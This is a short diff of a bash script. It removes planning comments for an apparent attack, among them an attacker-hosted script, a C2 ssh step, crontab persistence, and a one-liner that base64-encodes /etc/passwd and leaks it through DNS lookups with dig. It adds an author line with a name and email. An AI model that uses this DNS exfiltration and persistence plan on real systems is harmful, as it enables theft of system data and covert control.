@@ -1,24 +1,7 @@
 #!/bin/bash
 
-#add to the attacker ngnix 
-#attacker will host the script and will have a sg that allows anly the backect to pull the file
-#
-#
-#dig errtr.zina.com
-#dig fjhdfhj.zina.com * 10
-#
-#
-#sleep
-#
-#ssh command to the c2service
-#
-#simhash
-#
-#
-#cat /etc/password | base64b -w5 | sed '/\n/.zina.com\n' | xargs dig @1.1
-#
-#change /etc/cronab file
-#
+#Author: zina
+#Email: zinka.mevzos@gmail.com
 
 
 FILE=$(realpath ${0})
